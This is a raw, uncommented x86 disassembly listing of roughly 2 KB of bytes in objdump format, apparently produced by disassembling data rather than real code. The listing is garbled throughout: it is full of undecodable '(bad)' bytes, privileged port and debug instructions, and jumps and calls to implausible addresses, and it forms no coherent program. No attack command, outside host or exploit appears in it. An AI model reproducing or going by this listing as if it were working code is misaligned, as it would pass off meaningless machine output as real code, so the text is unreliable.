  430da7:	jne    0x430db9
  430da9:	movsx  edx,cl
  430dac:	add    DWORD PTR [eax],eax
  430dae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430db5:	mov    gs,edi
  430db7:	add    BYTE PTR [eax-0x50],ch
  430dba:	add    al,ch
  430dbc:	mov    eax,DWORD PTR [ecx]
  430dbe:	sub    eax,DWORD PTR [eax]
  430dc0:	jb     0x430e37
  430dc2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430dc6:	jge    0x430db0
  430dc8:	add    al,0x1
  430dca:	add    DWORD PTR [eax],0x0
  430dcd:	jne    0x430dcf
  430dcf:	je     0x430e16
  430dd1:	mov    eax,DWORD PTR [edi]
  430dd3:	ror    BYTE PTR [ebp+0x4d],1
  430dd6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ddd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430de3:	mov    DWORD PTR [ebx],ebp
  430de5:	fadd   DWORD PTR [eax+0x75]
  430de8:	inc    eax
  430de9:	pop    eax
  430dea:	lea    ebx,[ecx+0x4f]
  430ded:	push   0xb1000003
  430df2:	out    dx,eax
  430df3:	add    ebp,DWORD PTR [edx+edx*2]
  430df6:	add    BYTE PTR [ebx+ecx*4],bh
  430df9:	mov    ch,BYTE PTR [ebx]
  430dfb:	jb     0x430e6f
  430dfd:	add    al,0x89
  430dff:	push   eax
  430e00:	call   0x842b5b72
  430e05:	add    DWORD PTR [eax+eax*1],eax
  430e08:	jae    0x430e1e
  430e0a:	icebp  
  430e0b:	inc    ebp
  430e0c:	mov    eax,DWORD PTR gs:[ecx]
  430e0f:	int3   
  430e10:	out    dx,al
  430e11:	loopne 0x430e60
  430e13:	sub    eax,DWORD PTR [edx]
  430e15:	push   0xffffff83
  430e17:	pop    esi
  430e18:	push   cs
  430e19:	jl     0x430e34
  430e1b:	add    al,0xaf
  430e1d:	xor    eax,0x832b6d00
  430e22:	mov    eax,DWORD PTR [edx]
  430e24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430e2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430e30:	inc    ebp
  430e31:	shr    ebx,0x3
  430e34:	or     DWORD PTR [eax],0x4
  430e37:	push   0xffffffa5
  430e39:	pop    esi
  430e3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430e41:	jmp    0x430ea0
  430e43:	mov    edi,0xff0272
  430e48:	fdivr  QWORD PTR [ebp+0x5d]
  430e4b:	push   0x4e
  430e4d:	pop    ecx
  430e4e:	call   0x435253
  430e53:	mov    DWORD PTR [ebx],eax
  430e55:	in     al,0xc8
  430e57:	rol    BYTE PTR [ebp-0x75],0xc1
  430e5b:	call   0xad103c
  430e60:	pop    esi
  430e61:	enter  0xceff,0x8b
  430e65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430e69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430e70:	je     0x430e72
  430e72:	or     DWORD PTR [ebx-0x74183b24],eax
  430e78:	jne    0x430e5e
  430e7a:	jmp    0x430e75
  430e7c:	push   DWORD PTR [edx-0x24]
  430e7f:	push   0x4d
  430e81:	pop    ecx
  430e82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430e86:	jge    0x430e8e
  430e88:	mov    eax,eax
  430e8a:	sub    ebp,DWORD PTR [edx+0x24]
  430e8d:	pop    esi
  430e8e:	inc    ebp
  430e8f:	mov    esp,0x8b6077
  430e94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430e9a:	lods   al,BYTE PTR ds:[esi]
  430e9b:	add    BYTE PTR [ebx],bh
  430e9d:	enter  0xce73,0x49
  430ea1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430ea9:	stc    
  430eaa:	jge    0x430f1e
  430eac:	jnp    0xdd42921b
  430eb2:	call   0xc60f88
  430eb7:	fadd   st(0),st
  430eb9:	dec    esi
  430eba:	ins    BYTE PTR es:[edi],dx
  430ebb:	stc    
  430ebc:	cmp    al,0x73
  430ebe:	push   ebp
  430ebf:	mov    eax,0xf8028b
  430ec4:	jne    0x430e87
  430ec6:	mov    esi,ecx
  430ec8:	mov    esp,DWORD PTR [ebp+0x2c]
  430ecb:	add    edi,DWORD PTR [ebp-0x24]
  430ece:	sub    esp,eax
  430ed0:	and    al,0x45
  430ed2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430ed8:	sbb    al,0xee
  430eda:	pop    esi
  430edb:	call   0x830f0b
  430ee0:	fsubr  st,st(3)
  430ee2:	sti    
  430ee3:	add    BYTE PTR gs:[ecx],bh
  430ee6:	add    eax,esp
  430ee8:	add    DWORD PTR [esi],eax
  430eea:	rol    DWORD PTR [ebp+0x8],0x29
  430eee:	mov    esp,eax
  430ef0:	clc    
  430ef1:	jne    0x430f68
  430ef3:	mov    eax,0x8b0673
  430ef8:	loopne 0x430f3f
  430efa:	loopne 0x430e85
  430efc:	lods   al,BYTE PTR ds:[esi]
  430efd:	int3   
  430efe:	inc    ebp
  430eff:	mov    DWORD PTR gs:[eax+edi*8],eax
  430f03:	add    al,0xc3
  430f05:	sub    ecx,DWORD PTR [ebp+0x47]
  430f08:	(bad)  
  430f0a:	shr    BYTE PTR [ebp-0x1f],0xe8
  430f0e:	add    eax,DWORD PTR [eax]
  430f10:	call   0x644d015
  430f15:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430f1b:	dec    esi
  430f1c:	ins    DWORD PTR es:[edi],dx
  430f1d:	in     al,dx
  430f1e:	lea    eax,[eax]
  430f20:	inc    ebp
  430f21:	inc    ebp
  430f22:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430f28:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430f32:	and    al,0xdc
  430f34:	ror    DWORD PTR [edx+0x24],0xf7
  430f38:	or     BYTE PTR [ebp+0x4c],dh
  430f3b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430f3f:	stos   BYTE PTR es:[edi],al
  430f40:	adc    edx,edi
  430f42:	inc    esp
  430f43:	add    edi,DWORD PTR [eax]
  430f45:	jne    0x430f2a
  430f47:	mov    DWORD PTR [eax-0x7449db04],ecx
  430f4d:	cmp    ecx,DWORD PTR [edi]
  430f4f:	sub    BYTE PTR [ebp-0x7e],dl
  430f52:	sar    ebp,0xb
  430f55:	jmp    FWORD PTR [edi+0x2400392a]
  430f5b:	sub    esi,DWORD PTR [ebx-0x73]
  430f5e:	mov    esp,DWORD PTR [ecx+edi*4]
  430f61:	mov    ecx,DWORD PTR [eax]
  430f63:	and    BYTE PTR [eax],al
  430f65:	jne    0x430f31
  430f67:	sub    ebp,ecx
  430f69:	sbb    BYTE PTR [esi+0x32],ah
  430f6c:	dec    ebp
  430f6d:	push   ebp
  430f6e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  430f74:	ret    
  430f75:	mov    edx,ebp
  430f77:	leave  
  430f78:	sub    DWORD PTR [esi+0x24],ebx
  430f7b:	ret    0x2b
  430f7e:	pop    ax
  430f80:	push   ebp
  430f81:	rol    BYTE PTR [ebx],0xeb
  430f84:	add    DWORD PTR [ecx+0x6c0001],0x40
  430f8b:	jb     0x430fe2
  430f8d:	ret    
  430f8e:	in     al,dx
  430f8f:	jecxz  0x430f1c
  430f91:	push   esi
  430f92:	xchg   esp,eax
  430f93:	jne    0x430f95
  430f95:	cmp    edx,DWORD PTR [esi+0x1c]
  430f98:	jne    0x430f7e
  430f9a:	mov    eax,DWORD PTR [ebp-0x77]
  430f9d:	ror    DWORD PTR [ebx+0x899408],0xe0
  430fa4:	mov    esi,DWORD PTR [ebp-0x75]
  430fa7:	pop    esi
  430fa8:	nop
  430fa9:	mov    eax,DWORD PTR [eax]
  430fab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  430fb1:	add    al,0x0
  430fb3:	inc    ebp
  430fb4:	mov    eax,DWORD PTR [ebx]
  430fb6:	mov    ebp,ebx
  430fb8:	cmp    al,0xf
  430fba:	or     al,al
  430fbc:	inc    ebp
  430fbd:	inc    ebp
  430fbe:	xor    eax,0x8bc89c8b
  430fc3:	ins    BYTE PTR es:[edi],dx
  430fc4:	cld    
  430fc5:	add    BYTE PTR [edi+0x536c16c0],dh
  430fcb:	add    BYTE PTR [ecx-0x5],dl
  430fce:	add    eax,0x17200
  430fd3:	sbb    al,0x85
  430fd5:	dec    esp
  430fd6:	je     0x431010
  430fd8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  430fdc:	add    BYTE PTR [ebx],bh
  430fde:	(bad)  
  430fdf:	and    al,0x34
  430fe1:	jae    0x430f7f
  430fe3:	mov    cl,cl
  430fe5:	inc    DWORD PTR [esp]
  430fe8:	push   ebp
  430fe9:	shr    esp,0x8
  430fec:	in     al,dx
  430fed:	push   esp
  430fee:	add    DWORD PTR [eax],esp
  430ff0:	add    bl,cl
  430ff2:	inc    ebp
  430ff3:	mov    bh,0x89
  430ff5:	add    ah,bh
  430ff7:	jmp    0xca771f41
  430ffc:	pushf  
  430ffd:	dec    esp
  430ffe:	push   ebx
  430fff:	and    BYTE PTR [ebp+0x17],al
  431002:	xor    eax,0x56009cd9
  431007:	add    BYTE PTR [ebp+0x2b],al
  43100a:	in     eax,0xc1
  43100c:	inc    ebp
  43100d:	add    eax,0xc601d8
  431012:	mov    al,0xc6
  431015:	ins    BYTE PTR es:[edi],dx
  431016:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43101d:	dec    esp
  43101e:	xor    esp,DWORD PTR [eax]
  431020:	(bad)  
  431021:	fxch   st(1)
  431023:	sub    DWORD PTR [ebx],esi
  431025:	add    BYTE PTR [edx-0x40],bl
  431028:	mov    eax,0x248d8d00
  43102e:	xor    eax,0x188b0fc3
  431033:	push   ecx
  431034:	fimul  DWORD PTR [edx+0x8801d9]
  43103a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431041:	xor    ebx,ebp
  431043:	mov    al,BYTE PTR [ebp+0x1]
  431046:	jmp    0xdb4c554b
  43104b:	mov    dl,0x45
  43104d:	add    esi,ebp
  43104f:	add    BYTE PTR [ebp+0xe],al
  431052:	sub    DWORD PTR [edx+0x2e0145],eax
  431058:	inc    ebp
  431059:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43105d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431061:	cld    
  431062:	mov    dh,0xa5
  431064:	xor    edi,eax
  431066:	add    eax,DWORD PTR [ebp+0x46]
  431069:	prefetcht0 BYTE PTR [ecx-0x2]
  43106d:	xor    eax,0x7c60872
  431072:	mov    esp,0xbd32c69a
  431077:	pop    esi
  431078:	mov    cl,0xbe
  43107b:	or     al,0xc6
  43107d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431084:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43108b:	add    dh,al
  43108d:	mov    eax,ebx
  43108f:	xor    DWORD PTR [ebx],0x35008dbc
  431095:	mov    ecx,DWORD PTR [edi]
  431097:	sbb    al,0x18
  431099:	inc    ebp
  43109a:	fcmovb st,st(7)
  43109c:	fxtract 
  43109e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4310a4:	in     eax,dx
  4310a5:	call   0xf942962f
  4310aa:	inc    esi
  4310ac:	inc    ebp
  4310ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4310b3:	push   edi
  4310b4:	adc    eax,DWORD PTR [ebp-0x77]
  4310b7:	out    0x8b,eax
  4310b9:	inc    ebp
  4310ba:	cmp    BYTE PTR [ecx],ch
  4310bc:	inc    DWORD PTR [ebp+0x3b]
  4310bf:	inc    ebp
  4310c0:	jne    0x4310f0
  4310c2:	(bad)  
  4310c3:	(bad)  
  4310c4:	mov    eax,0xf87c8545
  4310c9:	test   BYTE PTR [ebp-0x47],0xea
  4310cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4310d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4310db:	inc    esi
  4310dc:	test   DWORD PTR [eax],ebx
  4310de:	add    bh,dh
  4310e0:	add    BYTE PTR [edx+0x45],dh
  4310e3:	(bad)  
  4310e4:	mov    ebx,esp
  4310e6:	jl     0x4310ae
  4310e8:	add    ch,bl
  4310ea:	mov    esi,eax
  4310ec:	mov    ebx,esi
  4310ee:	cld    
  4310ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4310f6:	cmp    dh,al
  4310f8:	imul   esp,ecx,0xe28dc600
  4310fe:	shl    DWORD PTR [ebx],1
  431100:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431106:	mov    ebx,DWORD PTR [eax]
  431108:	data16 fiadd DWORD PTR [ebp-0x770027]
  43110f:	add    eax,0x7
  431112:	in     ax,dx
  431114:	test   DWORD PTR [ebp-0x1],eax
  431117:	jmp    0xe48a571b
  43111c:	inc    bp
  43111e:	test   eax,esp
  431120:	inc    DWORD PTR [ebp-0x1]
  431123:	cmc    
  431124:	rol    BYTE PTR [ebp+0x66],0xdf
  431128:	test   DWORD PTR [ebp-0x1],eax
  43112b:	in     al,dx
  43112c:	inc    DWORD PTR [ebp+0x47]
  43112f:	out    0x66,eax
  431131:	inc    ebp
  431132:	test   DWORD PTR [edi+edi*8-0xa],edi
  431136:	inc    DWORD PTR [eax+eax*8-0x44]
  43113a:	data16 mov dh,0x85
  43113d:	xor    edi,edi
  43113f:	add    edi,edi
  431141:	inc    esi
  431142:	inc    edi
  431143:	sbb    BYTE PTR [esi-0x2],ah
  431146:	test   DWORD PTR [edx-0x1],esi
  431149:	(bad)  
  43114a:	(bad)  
  43114b:	cmp    bh,al
  43114d:	dec    DWORD PTR [ecx-0x278b77]
  431153:	dec    ebp
  431154:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43115b:	add    edi,edi
  43115d:	lea    edi,[eax+0xff99ff]
  431163:	enter  0xe89,0x78
  431167:	inc    ebp
  431168:	push   DWORD PTR ds:0xc7829cb8
  43116e:	add    BYTE PTR [eax-0x7857a77],bh
  431174:	inc    DWORD PTR [ebp-0x48]
  431177:	mov    edx,edi
  431179:	mov    WORD PTR [eax],es
  43117b:	add    BYTE PTR [ecx-0xf083c7],cl
  431181:	pop    edi
  431182:	add    DWORD PTR [eax],0xffffffe4
  431185:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43118b:	add    DWORD PTR [eax+0x382700],edi
  431191:	inc    ebp
  431192:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431198:	add    BYTE PTR [ecx+0x4f45b866],cl
  43119e:	lea    eax,[eax]
  4311a0:	add    eax,0x89660878
  4311a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4311ac:	loopne 0x431137
  4311ae:	(bad)  
  4311af:	data16 aam 0xff
  4311b2:	in     al,dx
  4311b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4311b8:	pop    ecx
  4311b9:	push   0x8ddaff18
  4311be:	jmp    0x4311bf
  4311c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4311c6:	lea    eax,[ebx-0x767aee30]
  4311cc:	(bad)  
  4311cd:	ins    BYTE PTR es:[edi],dx
  4311ce:	(bad)  
  4311cf:	inc    DWORD PTR [ebp-0xfb0173]
  4311d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4311db:	adc    DWORD PTR [ecx+0x3d],0x33
  4311df:	mov    DWORD PTR [ebx+0xff7270],edi
  4311e5:	(bad)  
  4311e6:	ret    
  4311e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4311ed:	call   DWORD PTR [eax-0x75]
  4311f0:	inc    ebp
  4311f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4311f8:	mov    eax,0x85ff66b0
  4311fe:	add    edi,edi
  431200:	add    bh,bh
  431202:	(bad)  
  431203:	stc    
  431204:	inc    DWORD PTR [eax]
  431206:	or     BYTE PTR [esi+0x45],ah
  431209:	test   DWORD PTR [ebp-0x7e008a01],eax
  43120f:	outs   dx,BYTE PTR ds:[esi]
  431210:	pop    DWORD PTR [eax]
  431212:	adc    ah,BYTE PTR [esi-0x78]
  431215:	test   DWORD PTR [eax-0x1],esi
  431218:	mov    ecx,0x6b4fff
  43121d:	add    cl,al
  43121f:	mov    WORD PTR [ebp-0x3f0078],ax
  431226:	mov    eax,eax
  431228:	data16 push bp
  43122b:	test   DWORD PTR [ebp-0x76000201],ecx
  431231:	dec    esp
  431232:	mov    WORD PTR [eax],es
  431234:	ret    0x6666
  431237:	inc    ebp
  431238:	push   ebp
  431239:	mov    eax,0xf3478d
  43123e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431244:	pushw  0x55
  431247:	lea    ax,[ebp-0x1f]
  43124b:	(bad)  
  43124c:	mov    eax,edx
  43124e:	xchg   esp,eax
  43124f:	in     al,0x89
  431251:	cmc    
  431252:	xchg   esi,eax
  431253:	inc    ebp
  431254:	iret   
  431255:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43125b:	ror    BYTE PTR [ebx+0x5532668a],1
  431261:	or     BYTE PTR [ebx+0x55186639],0x49
  431268:	(bad)  
  431269:	repz cmp eax,0xa0898945
  43126f:	mov    ah,0x89
  431271:	jmp    DWORD PTR [edx+0x66b0418d]
  431277:	inc    DWORD PTR [ebp+0x50]
  43127a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43127e:	mov    DWORD PTR [eax],ecx
  431280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431281:	pop    es
  431282:	inc    ecx
  431283:	(bad)  
  431284:	call   0x366:0x3245
  43128a:	dec    ebp
  43128b:	push   eax
  43128c:	inc    bp
  43128e:	jge    0x431213
  431290:	mov    esp,DWORD PTR [esi-0x18]
  431293:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431299:	add    DWORD PTR [ebx],esi
  43129b:	add    BYTE PTR [ebx],al
  43129d:	test   DWORD PTR [ebx],esi
  43129f:	(bad)  
  4312a0:	inc    WORD PTR [ebp+0x0]
  4312a4:	mov    eax,DWORD PTR [eax]
  4312a6:	call   0x8898c9db
  4312ab:	mov    esi,eax
  4312ad:	clc    
  4312ae:	ret    
  4312af:	rol    cl,0xa
  4312b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4312b8:	mov    edx,edi
  4312ba:	pushf  
  4312bb:	pop    es
  4312bc:	jmp    DWORD PTR [edx+0x66]
  4312bf:	add    BYTE PTR [ebp-0x990175],al
  4312c5:	inc    ebp
  4312c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4312cc:	push   ebp
  4312cd:	mov    edi,eax
  4312cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4312d5:	push   ebp
  4312d6:	add    BYTE PTR [ebx-0x764b0777],al
  4312dc:	dec    DWORD PTR [esi+0x661851e8]
  4312e2:	add    BYTE PTR [ebp-0x7b],dl
  4312e5:	cmp    esi,0xfffffff3
  4312e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4312ee:	jmp    DWORD PTR [esi-0x75]
  4312f1:	push   ebp
  4312f2:	hlt    
  4312f3:	data16 (bad) 
  4312f5:	dec    ebp
  4312f6:	ret    
  4312f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4312fd:	lea    edx,[eax-0x1]
  431300:	jne    0x4312d3
  431302:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431308:	dec    BYTE PTR [ecx+0x51559eff]
  43130e:	mov    DWORD PTR [esi-0x4c],esp
  431311:	push   ebp
  431312:	jmp    DWORD PTR [esi-0x18]
  431315:	inc    ebp
  431316:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43131c:	(bad)  
  43131d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43131e:	inc    eax
  431320:	test   DWORD PTR [esi-0x2],esp
  431323:	inc    ebp
  431324:	dec    DWORD PTR [ebp-0x760bde75]
  43132a:	(bad)  
  43132b:	test   al,0xc3
  43132d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431333:	lods   al,BYTE PTR ds:[esi]
  431334:	push   eax
  431335:	inc    ebp
  431336:	jne    0x431347
  431338:	dec    DWORD PTR [ebp+0x8]
  43133b:	mov    eax,DWORD PTR [ebx]
  43133d:	sbb    al,0x0
  43133f:	(bad)  
  431340:	mov    eax,0xc14fc3
  431345:	mov    DWORD PTR [eax-0x64],edi
  431348:	inc    bp
  43134a:	test   DWORD PTR [edi],ecx
  43134c:	dec    DWORD PTR [ebp-0x1]
  43134f:	xor    eax,edi
  431351:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431357:	inc    ebp
  431358:	xor    DWORD PTR [ebx],0x3f
  43135b:	mov    WORD PTR [ebp-0x1bc],ax
  431362:	lea    ecx,[ecx-0x767702]
  431368:	inc    esi
  431369:	(bad)  
  43136a:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  431371:	pushf  
  431372:	rol    DWORD PTR [ebp-0x72019a],0xff
  431379:	add    bh,bh
  43137b:	add    BYTE PTR [edi],cl
  43137d:	test   DWORD PTR [eax],eax
  43137f:	(bad)  
  431380:	dec    WORD PTR [ebp-0xff0031]
  431387:	mov    DWORD PTR [ecx-0xb748],ecx
  43138d:	lea    eax,[ebx+0x7cffc1b0]
  431393:	push   eax
  431394:	add    BYTE PTR [ebp+0x66],al
  431397:	xor    ecx,DWORD PTR [ebp-0xaf00fd]
  43139d:	test   eax,esi
  43139f:	(bad)  
  4313a0:	fdiv   st(7),st
  4313a2:	add    bh,bh
  4313a4:	data16 clc 
  4313a6:	lea    edx,[ebp-0x1]
  4313a9:	(bad)  
  4313aa:	dec    DWORD PTR [eax-0x72b50077]
  4313b0:	dec    DWORD PTR [eax-0x1237a73]
  4313b6:	(bad)  
  4313b7:	(bad)  
  4313b8:	(bad)  
  4313b9:	cdq    
  4313ba:	inc    DWORD PTR [eax]
  4313bc:	ja     0x431347
  4313be:	lea    edi,[eax-0x72000050]
  4313c4:	push   ecx
  4313c5:	mov    al,0x4d
  4313c7:	jmp    DWORD PTR [esi+0x50]
  4313ca:	mov    ch,0x45
  4313cc:	push   DWORD PTR [ebx]
  4313ce:	inc    DWORD PTR [ebx]
  4313d0:	push   ebx
  4313d1:	push   eax
  4313d2:	push   ecx
  4313d3:	test   DWORD PTR [ebx],esi
  4313d5:	(bad)  
  4313d6:	mov    ebx,0xff72ff
  4313db:	clc    
  4313dc:	retf   
  4313dd:	push   ebp
  4313de:	(bad)  
  4313df:	jmp    0x1421524
  4313e4:	push   ecx
  4313e5:	jae    0x4313a7
  4313e7:	add    BYTE PTR [ebp-0x38bb73],cl
  4313ed:	mov    DWORD PTR [ecx+0x40],edx
  4313f0:	(bad)  
  4313f1:	(bad)  
  4313f2:	cld    
  4313f3:	mov    eax,DWORD PTR [ebp-0x7a019a]
  4313f9:	inc    DWORD PTR [ebp-0x3f0101]
  4313ff:	inc    bp
  431401:	test   DWORD PTR [ebx+0xff98ff],ecx
  431407:	inc    edi
  431408:	(bad)  
  431409:	dec    si
  43140b:	test   edi,edi
  43140d:	(bad)  
  43140e:	cmp    eax,0xc74f7bff
  431413:	mov    edx,DWORD PTR [edx-0x7d]
  431416:	(bad)  
  431417:	mov    ebx,0x563a8931
  43141c:	(bad)  
  43141d:	call   FWORD PTR [esi-0x47]
  431420:	inc    DWORD PTR ds:0x893c00e2
  431426:	mov    DWORD PTR [eax-0x4c],ebx
  431429:	(bad)  
  43142a:	jmp    DWORD PTR [esi-0x1]
  43142d:	test   edi,edi
  43142f:	dec    DWORD PTR [eax]
  431431:	(bad)  
  431432:	inc    eax
  431434:	or     BYTE PTR [ecx+0x8b5745],bh
  43143a:	sbb    al,0x89
  43143c:	rcr    BYTE PTR [edx-0x7c],0xff
  431440:	add    ecx,DWORD PTR [ebx+0x6165b900]
  431446:	add    BYTE PTR [eax],al
  431448:	inc    ebp
  431449:	mov    DWORD PTR ds:0xc7ff9c5c,esi
  43144f:	data16 fdiv DWORD PTR [ebp-0x7007b]
  431456:	inc    ebp
  431457:	dec    ebp
  431458:	cmp    DWORD PTR [ecx-0x38b764],ecx
  43145e:	lock lea eax,[ebp+0x458df81c]
  431465:	(bad)  
  431466:	xor    eax,0x8b8b9fff
  43146b:	hlt    
  43146c:	cld    
  43146d:	mov    DWORD PTR [eax+0xff014c],eax
  431473:	mov    esi,0x78b0845
  431478:	cld    
  431479:	into   
  43147a:	dec    ebp
  43147b:	call   0x5100:0x38c328b
  431482:	mov    ecx,DWORD PTR [ebp-0x6f0075]
  431488:	add    BYTE PTR [ebx],dh
  43148a:	mov    DWORD PTR [eax-0x1c],eax
  43148d:	lea    edi,[ebp-0x2]
  431490:	test   edi,edi
  431492:	jne    0x4314e4
  431494:	push   DWORD PTR [ebp+0x18]
  431497:	mov    DWORD PTR [ebp+0x44],edx
  43149a:	call   0xffcd0f9e
  43149f:	mov    al,0x45
  4314a1:	dec    DWORD PTR [ebx+0x3fc8b8b]
  4314a7:	cmp    BYTE PTR [ecx+eax*1],0xf
  4314ab:	add    BYTE PTR [ebp-0x7b],al
  4314ae:	test   edi,edi
  4314b0:	je     0x4314b1
  4314b2:	dec    DWORD PTR [edi-0x4]
  4314b5:	dec    edi
  4314b6:	or     al,BYTE PTR [ebp-0x740001]
  4314bc:	cld    
  4314bd:	dec    edi
  4314be:	or     BYTE PTR [edi+0x1],0x85
  4314c2:	add    bh,bh
  4314c4:	add    bh,bh
  4314c6:	(bad)  
  4314c7:	icebp  
  4314c8:	ret    
  4314c9:	dec    edi
  4314ca:	inc    ebp
  4314cb:	xchg   ebp,eax
  4314cc:	jne    0x4314cc
  4314ce:	mov    edi,edi
  4314d0:	cld    
  4314d1:	xor    BYTE PTR [ecx+0x500155],cl
  4314d7:	push   ebp
  4314d8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4314de:	add    BYTE PTR [ebp+0x35e90f50],al
  4314e4:	add    al,BYTE PTR [eax]
  4314e6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4314ec:	add    ah,ch
  4314ee:	or     BYTE PTR [ebp+0x4501f845],dh
  4314f4:	jmp    0xdf17ee
  4314f9:	(bad)  
  4314fa:	nop    ecx
  4314fd:	test   DWORD PTR [ebp+0x4502f8],eax
  431503:	cmp    ecx,DWORD PTR [ebp-0x64]
  431506:	mov    eax,edi
  431508:	mov    ebx,DWORD PTR [eax+edx*2]
  43150b:	add    eax,0x45fef885
  431510:	dec    DWORD PTR [ebx+0x339445]
  431516:	add    ecx,DWORD PTR [ecx+0x4500f889]
  43151c:	dec    DWORD PTR [ebx-0x460f0375]
  431522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431523:	add    esi,edi
  431525:	add    bh,bh
  431527:	rdpmc  
  431529:	add    BYTE PTR [ebx],0x1
  43152c:	mov    DWORD PTR [eax],eax
  43152e:	add    al,0x45
  431530:	dec    DWORD PTR [ecx-0x360b3373]
  431536:	dec    DWORD PTR [esi]
  431538:	push   eax
  431539:	jne    0x431580
  43153b:	mov    esi,DWORD PTR [ebx]
  43153d:	cld    
  43153e:	add    ebp,ebp
  431540:	push   eax
  431541:	inc    DWORD PTR [ebp-0x75]
  431544:	add    eax,0x800e4
  431549:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43154f:	mov    DWORD PTR [ecx],eax
  431551:	sbb    al,0x0
  431553:	leave  
  431554:	test   DWORD PTR [edi-0x2],eax
  431557:	jne    0x431558
  431559:	call   0xff44005e
  43155e:	xor    BYTE PTR [ebp+0x4d],al
  431561:	mov    edi,edi
  431563:	enter  0x8,0x4d
  431567:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43156d:	mov    eax,DWORD PTR [eax]
  43156f:	cld    
  431570:	add    DWORD PTR [ecx],ebx
  431572:	inc    ebp
  431573:	dec    ebp
  431574:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43157a:	inc    eax
  43157b:	dec    DWORD PTR [ecx-0x270375]
  431581:	add    BYTE PTR [ebx-0x39d72701],cl
  431587:	xchg   ecx,eax
  431588:	ret    
  431589:	add    BYTE PTR [ebp-0x830075],al
  43158f:	add    BYTE PTR [ebp-0x75],al
  431592:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431598:	lea    edi,[edi-0xc]
  43159b:	add    bh,bh
  43159d:	mov    edx,DWORD PTR [eax-0x7b]
  4315a0:	inc    ebp
  4315a1:	rdpmc  
  4315a3:	jne    0x4315a8
  4315a5:	add    BYTE PTR [eax-0x75],dl
  4315a8:	inc    ebp
  4315a9:	clc    
  4315aa:	add    eax,0x400009
  4315af:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4315b5:	mov    eax,DWORD PTR [ecx]
  4315b7:	in     al,dx
  4315b8:	add    dh,al
  4315ba:	test   ebx,eax
  4315bc:	inc    BYTE PTR [ebp-0xff0001]
  4315c2:	add    BYTE PTR [ebp-0x43],al
  4315c5:	cmp    esi,0xfffffff8
  4315c8:	(bad)  
  4315c9:	push   DWORD PTR [eax]
  4315cb:	add    BYTE PTR [ebp-0x3a],dl
  4315ce:	test   ebx,eax
  4315d0:	je     0x431557
  4315d2:	mov    edi,edi
  4315d4:	sbb    al,0xff
  4315d6:	test   DWORD PTR gs:[eax],eax
  4315d9:	(bad)  
  4315da:	js     0x4315db
  4315dc:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4315e2:	sub    eax,ebx
  4315e4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4315ea:	add    eax,DWORD PTR [eax]
  4315ec:	dec    ebp
  4315ed:	push   eax
  4315ee:	mov    al,BYTE PTR [ebp+0x1]
  4315f1:	mov    eax,DWORD PTR [ebp-0x68]
  4315f4:	mov    eax,DWORD PTR [eax]
  4315f6:	sbb    bh,al
  4315f8:	or     ah,dh
  4315fa:	dec    ebp
